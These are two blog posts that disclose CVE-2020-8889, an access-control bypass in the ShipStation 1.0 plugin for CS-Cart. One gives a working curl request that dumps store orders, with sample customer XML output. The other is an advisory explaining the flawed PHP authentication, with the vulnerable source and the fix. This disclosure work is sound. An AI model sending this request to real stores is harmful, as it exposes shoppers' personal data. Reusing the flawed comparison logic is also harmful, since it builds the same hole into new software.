=== Content from www.jerdiggity.com_9e37e597_20250119_111821.html ===

[Skip to main content](#main-content)

[![Home](https://www.jerdiggity.com/sites/jerdiggity.com/files/jerlogo_trans.png)](/ "Home")
**[JerDiggity](/ "Home")**

Genius

## Main menu

* [Home](/)

## You are here

[Home](/) » [Blogs](/blog) » [jer's blog](/blog/1)
# Minimum requirements for CVE-2020-8889

Submitted by jer on Fri, 03/31/2023 - 02:15

Minimum requirements:

1. Visit the home page of a CS-Cart store which has the ShipStation plugin 1.0 installed (previously available at <https://ss7.shipstation.com/content/integration/CSCart/shipstation_cs-cart_1.0.5.zip> but replaced with <https://ss7.shipstation.com/content/integration/CSCart/shipstation_cs-cart_1.0.10.zip>)
2. Add the following query string parameters to the store's home page URL (in **bold**):
   * **dispatch=shipstation**
   * **action=export**
   * **end\_date=2050** *(or any future year readable by PHP's strtotime() function)*

Example via curl (assuming CS-Cart is installed at <http://localhost>):

```
$ curl 'http://localhost/?dispatch=shipstation&action=export&end_date=2050'
<?xml version="1.0" standalone="yes"?><Orders pages="2"><Order><OrderID><![CDATA[28]]></OrderID><OrderNumber><![CDATA[28]]></OrderNumber><OrderDate><![CDATA[9/25/2013 23:01 PM]]></OrderDate><OrderStatus><![CDATA[complete]]></OrderStatus><LastModified><![CDATA[9/25/2013 23:01 PM]]></LastModified><ShippingMethod><![CDATA[Custom shipping method]]></ShippingMethod><PaymentMethod><![CDATA[1]]></PaymentMethod><OrderTotal><![CDATA[917.99]]></OrderTotal><TaxAmount><![CDATA[0]]></TaxAmount><ShippingAmount><![CDATA[0.00]]></ShippingAmount><CustomerNotes><![CDATA[]]></CustomerNotes><InternalNotes><![CDATA[]]></InternalNotes><Customer><CustomerCode><![CDATA[davdavid@example.com]]></CustomerCode><BillTo><Name><![CDATA[David Tenant]]></Name><Company><![CDATA[]]></Company><Phone><![CDATA[+55(55)5555-5555]]></Phone><Email><![CDATA[davdavid@example.com]]></Email></BillTo><ShipTo><Name><![CDATA[David Tenant]]></Name><Company><![CDATA[]]></Company><Address1><![CDATA[Glasgow, Lanarkshire G2 1DS]]></Address1><Address2><![CDATA[]]></Address2><City><![CDATA[Glasgow]]></City><State><![CDATA[GLAS]]></State><PostalCode><![CDATA[141 332]]></PostalCode><Country><![CDATA[GB]]></Country><Phone><![CDATA[+55(55)5555-5555]]></Phone></ShipTo></Customer><Items><Item><SKU><![CDATA[H0148VPS1T]]></SKU><Name><![CDATA[16GB A Series Walkman Video MP3]]></Name><ImageUrl><![CDATA[http://localhost/images/detailed/0/NWZA865BLK.jpg]]></ImageUrl><Weight><![CDATA[0.000]]></Weight><WeightUnits><![CDATA[lbs]]></WeightUnits><Quantity><![CDATA[1]]></Quantity><UnitPrice><![CDATA[219.00]]></UnitPrice><Location><![CDATA[]]></Location></Item><Item><SKU><![CDATA[Q01802L8VS]]></SKU><Name><![CDATA[18-55mm Portrait Lens]]></Name><ImageUrl><![CDATA[http://localhost/images/detailed/0/EX-S1855SB_600.jpg]]></ImageUrl><Weight><![CDATA[0.000]]></Weight><WeightUnits><![CDATA[lbs]]></WeightUnits><Quantity><![CDATA[1]]></Quantity><UnitPrice><![CDATA[199.99]]></UnitPrice><Location><![CDATA[]]></Location></Item><Item><SKU><![CDATA[I0241GCXF9]]></SKU><Name><![CDATA[Apple® - iPad® with Retina® display Wi-Fi - 32GB - White]]></Name><ImageUrl><![CDATA[http://localhost/images/detailed/0/ipad-white-1.jpg]]></ImageUrl><Weight><![CDATA[0.000]]></Weight><WeightUnits><![CDATA[lbs]]></WeightUnits><Quantity><![CDATA[1]]></Quantity><UnitPrice><![CDATA[499.00]]></UnitPrice><Location><![CDATA[]]></Location><Options><Option><Name><![CDATA[3G Connectivity]]></Name><Value><![CDATA[No]]></Value><Weight><![CDATA[0.000]]></Weight></Option><Option><Name><![CDATA[Memory capacity]]></Name><Value><![CDATA[16GB]]></Value><Weight><![CDATA[0.000]]></Weight></Option></Options></Item></Items></Order><Order><OrderID><![CDATA[40]]></OrderID><OrderNumber><![CDATA[40]]></OrderNumber><OrderDate><![CDATA[10/2/2013 14:12 PM]]></OrderDate><OrderStatus><![CDATA[complete]]></OrderStatus><LastModified><![CDATA[10/2/2013 14:12 PM]]></LastModified><ShippingMethod><![CDATA[Custom shipping method]]></ShippingMethod><PaymentMethod><![CDATA[1]]></PaymentMethod><OrderTotal><![CDATA[299.99]]></OrderTotal><TaxAmount><![CDATA[0]]></TaxAmount><ShippingAmount><![CDATA[0.00]]></ShippingAmount><CustomerNotes><![CDATA[]]></CustomerNotes><InternalNotes><![CDATA[]]></InternalNotes><Customer><CustomerCode><![CDATA[sebastian@example.com]]></CustomerCode><BillTo><Name><![CDATA[Sergey Maxeev]]></Name><Company><![CDATA[]]></Company><Phone><![CDATA[+79235456683]]></Phone><Email><![CDATA[sebastian@example.com]]></Email></BillTo><ShipTo><Name><![CDATA[Sergey Maxeev]]></Name><Company><![CDATA[]]></Company><Address1><![CDATA[Moskovskaya street, 65-12]]></Address1><Address2><![CDATA[]]></Address2><City><![CDATA[Moscow]]></City><State><![CDATA[MOS]]></State><PostalCode><![CDATA[657849]]></PostalCode><Country><![CDATA[RU]]></Country><Phone><![CDATA[+79235456683]]></Phone></ShipTo></Customer><Items><Item><SKU><![CDATA[D0187LXFZO]]></SKU><Name><![CDATA[2010 TOUR STAFF Bag 10"]]></Name><ImageUrl><![CDATA[http://localhost/images/detailed/0/167734bda696f56942c278bee07e7236.jpg]]></ImageUrl><Weight><![CDATA[0.000]]></Weight><WeightUnits><![CDATA[lbs]]></WeightUnits><Quantity><![CDATA[1]]></Quantity><UnitPrice><![CDATA[299.99]]></UnitPrice><Location><![CDATA[]]></Location></Item></Items></Order><Order><OrderID><![CDATA[53]]></OrderID><OrderNumber><![CDATA[53]]></OrderNumber><OrderDate><![CDATA[10/15/2013 08:44 AM]]></OrderDate><OrderStatus><![CDATA[complete]]></OrderStatus><LastModified><![CDATA[10/15/2013 08:44 AM]]></LastModified><ShippingMethod><![CDATA[Custom shipping method]]></ShippingMethod><PaymentMethod><![CDATA[2]]></PaymentMethod><OrderTotal><![CDATA[80.99]]></OrderTotal><TaxAmount><![CDATA[0]]></TaxAmount><ShippingAmount><![CDATA[33.00]]></ShippingAmount><CustomerNotes><![CDATA[]]></CustomerNotes><InternalNotes><![CDATA[]]></InternalNotes><Customer><CustomerCode><![CDATA[dsds@example.com]]></CustomerCode><BillTo><Name><![CDATA[George Nills]]></Name><Company><![CDATA[]]></Company><Phone><![CDATA[+1 646-386-3600]]></Phone><Email><![CDATA[dsds@example.com]]></Email></BillTo><ShipTo><Name><![CDATA[George Nills]]></Name><Company><![CDATA[]]></Company><Address1><![CDATA[60 Centre Street #5]]></Address1><Address2><![CDATA[]]></Address2><City><![CDATA[New York]]></City><State><![CDATA[NY]]></State><PostalCode><![CDATA[01342]]></PostalCode><Country><![CDATA[US]]></Country><Phone><![CDATA[+1 646-386-3600]]></Phone></ShipTo></Customer><Items><Item><SKU><![CDATA[H023315I7E]]></SKU><Name><![CDATA[Crystal Lake Warm Weather Sleeping Bag]]></Name><ImageUrl><![CDATA[http://localhost/images/detailed/0/2000004455_500.jpg]]></ImageUrl><Weight><![CDATA[0.000]]></Weight><WeightUnits><![CDATA[lbs]]></WeightUnits><Quantity><![CDATA[1]]></Quantity><UnitPrice><![CDATA[47.99]]></UnitPrice><Location><![CDATA[]]></Location></Item></Items></Order><Order><OrderID><![CDATA[41]]></OrderID><OrderNumber><![CDATA[41]]></OrderNumber><OrderDate><![CDATA[10/3/2013 13:33 PM]]></OrderDate><OrderStatus><![CDATA[complete]]></OrderStatus><LastModified><![CDATA[10/3/2013 13:33 PM]]></LastModified><ShippingMethod><![CDATA[Custom shipping method]]></ShippingMethod><PaymentMethod><![CDATA[2]]></PaymentMethod><OrderTotal><![CDATA[100.00]]></OrderTotal><TaxAmount><![CDATA[0]]></TaxAmount><ShippingAmount><![CDATA[0.00]]></ShippingAmount><CustomerNotes><![CDATA[]]></CustomerNotes><InternalNotes><![CDATA[]]></InternalNotes><Customer><CustomerCode><![CDATA[sebastian@example.com]]></CustomerCode><BillTo><Name><![CDATA[Sergey Maxeev]]></Name><Company><![CDATA[]]></Company><Phone><![CDATA[+79235456683]]></Phone><Email><![CDATA[sebastian@example.com]]></Email></BillTo><ShipTo><Name><![CDATA[Sergey Maxeev]]></Name><Company><![CDATA[]]></Company><Address1><![CDATA[Moskovskaya street, 65-12]]></Address1><Address2><![CDATA[]]></Address2><City><![CDATA[Moscow]]></City><State><![CDATA[MOS]]></State><PostalCode><![CDATA[657849]]></PostalCode><Country><![CDATA[RU]]></Country><Phone><![CDATA[+79235456683]]></Phone></ShipTo></Customer><Items><Item><SKU><![CDATA[L0078RO9Y9]]></SKU><Name><![CDATA[adizero Rush Shoes]]></Name><ImageUrl><![CDATA[http://localhost/images/detailed/0/G48874_01.jpg]]></ImageUrl><Weight><![CDATA[0.000]]></Weight><WeightUnits><![CDATA[lbs]]></WeightUnits><Quantity><![CDATA[1]]></Quantity><UnitPrice><![CDATA[100.00]]></UnitPrice><Location><![CDATA[]]></Location></Item></Items></Order><Order><OrderID><![CDATA[61]]></OrderID><OrderNumber><![CDATA[61]]></OrderNumber><OrderDate><![CDATA[10/23/2013 09:38 AM]]></OrderDate><OrderStatus><![CDATA[complete]]></OrderStatus><LastModified><![CDATA[10/23/2013 09:38 AM]]></LastModified><ShippingMethod><![CDATA[Custom shipping method]]></ShippingMethod><PaymentMethod><![CDATA[2]]></PaymentMethod><OrderTotal><![CDATA[479.99]]></OrderTotal><TaxAmount><![CDATA[0]]></TaxAmount><ShippingAmount><![CDATA[0.00]]></ShippingAmount><CustomerNotes><![CDATA[]]></CustomerNotes><InternalNotes><![CDATA[]]></InternalNotes><Customer><CustomerCode><![CDATA[customer@example.com]]></CustomerCode><BillTo><Name><![CDATA[Customer Customer]]></Name><Company><![CDATA[]]></Company><Phone><![CDATA[]]></Phone><Email><![CDATA[customer@example.com]]></Email></BillTo><ShipTo><Name><![CDATA[Customer Customer]]></Name><Company><![CDATA[]]></Company><Address1><![CDATA[44 Main street]]></Address1><Address2><![CDATA[]]></Address2><City><![CDATA[Boston]]></City><State><![CDATA[MA]]></State><PostalCode><![CDATA[02134]]></PostalCode><Country><![CDATA[US]]></Country><Phone><![CDATA[]]></Phone></ShipTo></Customer><Items><Item><SKU><![CDATA[Y0224Y3QQU]]></SKU><Name><![CDATA[Samsung Galaxy Tab™ 8.9 (AT&T)]]></Name><ImageUrl><![CDATA[http://localhost/images/detailed/0/i957_600x600_xlarge_hf.jpg]]></ImageUrl><Weight><![CDATA[0.000]]></Weight><WeightUnits><![CDATA[lbs]]></WeightUnits><Quantity><![CDATA[1]]></Quantity><UnitPrice><![CDATA[479.99]]></UnitPrice><Location><![CDATA[]]></Location></Item></Items></Order></Orders>
```

* [jer's blog](/blog/1 "Read jer's latest blog entries.")



=== Content from www.jerdiggity.com_922c1bd4_20250119_111821.html ===

[Skip to main content](#main-content)

[![Home](https://www.jerdiggity.com/sites/jerdiggity.com/files/jerlogo_trans.png)](/ "Home")
**[JerDiggity](/ "Home")**

Genius

## Main menu

* [Home](/)

## You are here

[Home](/) » [Blogs](/blog) » [jer's blog](/blog/1)
# SA: Shipstation plugin for CS-Cart - Incorrect Access Control

Submitted by jer on Fri, 03/17/2023 - 15:21

Description:

The ShipStation.com plugin 1.0 for CS-Cart allows remote attackers to obtain sensitive information (via action=export) because a typo results in a successful comparison of a blank password and NULL.

Additional information:

Multiple access bypass vulnerabilities in the file named shipstation.php, with trigger points at line 36 as well as line 31 and as explained in more detail below, in the ShipStation.com CS-Cart plugin 1.0 allow remote attackers to access sensitive user and purchase data from a CS-Cart installation via accessing the front page of the store with approximately four key/value pairs appended to the query string of the URL: "dispatch=shipstation", "action=export", "start\_date=START\_DATE\_HERE", and "end\_date=END\_DATE\_HERE", where START\_DATE\_HERE and END\_DATE\_HERE are replaced with a date readable by PHP's strtotime() function. Trigger point specifics as previously referenced are as follows. (1) Line 36 of shipstation.php seeks to deny access by way of comparing the remote username and the remote password each to its respective counterpart as stored in the CS-Cart database; however instead of validating whether either of those exclusive values are not a match (thereby denying access in either case), line 36 denies access only when both the remote username does not match the local username and when the remote password does not match the local password. In other words, if either one is a mismatch then access is not denied. (2) Line 36 of shipstation.php does utilize strict type comparison operators during authentication, the importance of which being explained shortly hereafter. (3) Line 31 of shipstation.php attempts to retrieve a password value from CS-Cart's registry whose key is "addons.shipstations.password". However, while this is a simple typo ("shipstations" instead of "shipstation"), the result is that said registry key's value becomes unretrievable since it is unable to be set from anywhere within the administrative control panel, and its returned value will always be NULL. Further, since that same value is later used on line 36 for comparison to the remote password for authentication purposes, even if numbers 1 and 2 as described above were non-existent, a remote attacker could still bypass access restrictions by providing an empty string as the remote password since an empty string and NULL would technically match each other in PHP since strict type comparison operators are not utilized here.

Solution:

This advisory only applies to the plugin which was previously provided directly by ShipStation's UI. The plugin has since been moved to Github.

For users who obtained the plugin directly from the ShipStation UI, install version 1.0.10 which is now hosted on Github at <https://github.com/shipstation/plugin-cs-cart>.

Original source code:

```
<?php
/***************************************************************************
*                                                                          *
*   (c) 2004 Vladimir V. Kalynyak, Alexey V. Vinokurov, Ilya M. Shalnev    *
*                                                                          *
* This  is  commercial  software,  only  users  who have purchased a valid *
* license  and  accept  to the terms of the  License Agreement can install *
* and use this program.                                                    *
*                                                                          *
****************************************************************************
* PLEASE READ THE FULL TEXT  OF THE SOFTWARE  LICENSE   AGREEMENT  IN  THE *
* "copyright.txt" FILE PROVIDED WITH THIS DISTRIBUTION PACKAGE.            *
****************************************************************************/

header('Content-Type: text/xml');

if (!defined('BOOTSTRAP')) { die('Access denied'); }

use Tygh\Registry;
$action = strtolower($_REQUEST['action']);

$post_data = '';

if ($action == 'export') {

    $username = empty($_SERVER['PHP_AUTH_USER']) ? $_SERVER['HTTP_SS_AUTH_USER'] : $_SERVER['PHP_AUTH_USER'];
    $password = empty($_SERVER['PHP_AUTH_PW']) ? $_SERVER['HTTP_SS_AUTH_PW'] : $_SERVER['PHP_AUTH_PW'];

    //if (empty($_REQUEST['vendor']) || !fn_allowed_for('MULTIVENDOR')) {
        $addon_username = Registry::get('addons.shipstation.username');
        $addon_password = Registry::get('addons.shipstations.password');
    //} elseif (fn_allowed_for('MULTIVENDOR')) {
        //list($addon_username, $addon_password) = db_get_row("SELECT shipstation_username, shipstation_password FROM ?:companies WHERE company_id = ?i", $_REQUEST['vendor']);
    //}

    if ($username != $addon_username && $password != $addon_password) {
        die('Access denied - Wrong username or password');
    }

    if (isset($_REQUEST['start_date'])) {
        $start_date = $_REQUEST['start_date'];
    }

    if (isset($_REQUEST['end_date'])) {
        $end_date = $_REQUEST['end_date'];
    }

    $page = empty($_REQUEST['page']) ? 1 : $_REQUEST['page'];
    $items_per_page = Registry::get('settings.Appearance.admin_orders_per_page');
    $limit = db_paginate($page, $items_per_page);
    $condition = " AND is_parent_order != 'Y'";
    $condition .= db_quote(" AND ((timestamp >= ?i AND timestamp <= ?i) OR (last_modify != 0 AND last_modify >= ?i AND last_modify <= ?i))", strtotime($start_date), strtotime($end_date), strtotime($start_date), strtotime($end_date));
    if (fn_allowed_for('MULTIVENDOR') && !empty($_REQUEST['vendor'])) {
        $condition .= db_quote(" AND company_id = ?i ", $_REQUEST['vendor']);
    }

    $order_ids = db_get_fields("SELECT order_id FROM ?:orders "
                                . " WHERE 1 $condition  $limit");

    $total = db_get_field("SELECT COUNT(DISTINCT(order_id)) FROM ?:orders WHERE 1 $condition");
    $total_pages = ceil(($total * 1.0)/ $items_per_page);

    $post_data = fn_shipstation_xml_header();

    $post_data .= fn_shipstation_add_tag("Orders", ($total_pages > 1 && $page == 1 ? array('pages' => $total_pages) : array())); // TODO split to pages

    foreach ($order_ids as $order_id) {
        $post_data .= fn_shipstation_add_order($order_id);
    }
    $post_data .= fn_shipstation_close_tag("Orders");

} elseif ($action == 'shipnotify') {
    $body = '';
    $fh   = @fopen('php://input', 'r');
    if ($fh) {
        while (!feof($fh)) {
            $s = fread($fh, 1024);
            if (is_string($s)) {
                $body .= $s;
            }
        }
        fclose($fh);
    }
    $order_id = $_REQUEST['order_number'];

    $tracking_number = $_REQUEST['tracking_number'];

    if (empty($order_id) || empty($tracking_number)) {
        header("HTTP/1.0 404", true, 404);
        exit;
    } else {
        $order_info = fn_get_order_info($order_id);
        if (!empty($order_info)) {
            $products = $order_info['products'];

            $order_shipments = db_get_hash_array("SELECT sum(amount) as amount, item_id FROM ?:shipment_items WHERE order_id = ?i GROUP BY item_id", 'item_id', $order_id);
            $all_shipped = true;

            foreach ($products as $item_id => $product) {
                if (isset($order_shipments[$item_id])) {
                    $order_amount = $product['amount'];
                    $shipped_amount = $order_shipments[$item_id]['amount'];

                    if (($order_amount > $shipped_amount) || ($order_amount == $shipped_amount)) {
                        $all_shipped = false;
                        break;
                    }
                } else {
                    $all_shipped = false;
                    break;
                }
            }

            if ($all_shipped) {
                header("HTTP/1.0 404", true, 404);
                die('All shipped');
            }

            $carriers = fn_get_carriers();
            $carrier = '';
            foreach ($carriers as $s_carrier) {
                if (strtolower($s_carrier) == strtolower($_REQUEST['carrier'])) {
                    $carrier = $s_carrier;
                    break;
                }
            }

            if (empty($carrier) && !empty($_carrier)) {
                $carrier = $_carrier;
            }
            $comments = '';
            $doc = new DomDocument('1.0', 'utf-8');
            $doc->loadXML($body);
            $xp = new DomXPath($doc);

            foreach ($xp->query('//NotesToCustomer') as $node) {
                $comments = $node->nodeValue;
            }

            foreach ($xp->query('//ShipDate') as $node) {
                $shipdate = $node->nodeValue;
            }

            $_products = array();
            foreach ($xp->query('//Items') as $node) {
                foreach ($node->childNodes as $item) {
                    $amount = 0;
                    $item_id = 0;
                    foreach ($item->childNodes as $subnode) {
                        if ($subnode->nodeName == 'Quantity') {
                            $amount = $subnode->nodeValue;
                        }
                        if ($subnode->nodeName == 'SKU') {
                            $order_details = db_get_row("SELECT item_id, amount FROM ?:order_details WHERE order_id = ?i AND product_code = ?s", $order_id, $subnode->nodeValue);
                            if (!empty($order_details['item_id'])) {
                                $item_id = $order_details['item_id'];
                            }
                        }
                    }
                    if (!empty($item_id)) {
                        $_products[$item_id] = $amount;
                    }
                }
            }

            $ship_data = array(
                 'shipping_id' => $order_info['shipping_ids'],
                 'tracking_number' => $tracking_number,
                 'carrier' => $carrier,
                 'comments' => $comments,
                 'timestamp' => !empty($shipdate) ? strtotime($shipdate) : time()
            );

            $shipment_id = db_query("INSERT INTO ?:shipments ?e", $ship_data);

            foreach ($_products as $key => $amount) {
                if (isset($order_info['products'][$key])) {
                    $amount = intval($amount);
                }

                if ($amount == 0) {
                    continue;
                }

                $_data = array(
                    'item_id' => $key,
                    'shipment_id' => $shipment_id,
                    'order_id' => $order_id,
                    'product_id' => $order_info['products'][$key]['product_id'],
                    'amount' => $amount,
                );

                db_query("INSERT INTO ?:shipment_items ?e", $_data);
            }
            $order_shipments = db_get_hash_array("SELECT sum(amount) as amount, item_id FROM ?:shipment_items WHERE order_id = ?i GROUP BY item_id", 'item_id', $order_id);
            $all_shipped = true;

            foreach ($products as $item_id => $product) {
                if (isset($order_shipments[$item_id])) {
                    $order_amount = $product['amount'];
                    $shipped_amount = $order_shipments[$item_id]['amount'];

                    if ($order_amount > $shipped_amount) {
                        $all_shipped = false;
                        break;
                    }
                } else {
                    $all_shipped = false;
                    break;
                }
            }
            if ($all_shipped) {
                $shipped_status = Registry::get('addons.shipstation.shipped_statuses');
                if (is_array($shipped_status)) {
                    $shipped_status = reset(array_keys($shipped_status));
                    $shipped_status = str_replace('status_', '', $shipped_status);
                }
                if (empty($shipped_status)) {
                    $shipped_status = 'C';
                }
                fn_change_order_status($order_id, $shipped_status, '', true);
            }
            header("HTTP/1.0 200", true, 200);
            exit;
        } else {
            header("HTTP/1.0 404", true, 404);
            exit;
        }

    }
} else {
    header("HTTP/1.0 200", true, 200);
    exit;
}

echo $post_data;

exit;

```

* [jer's blog](/blog/1 "Read jer's latest blog entries.")


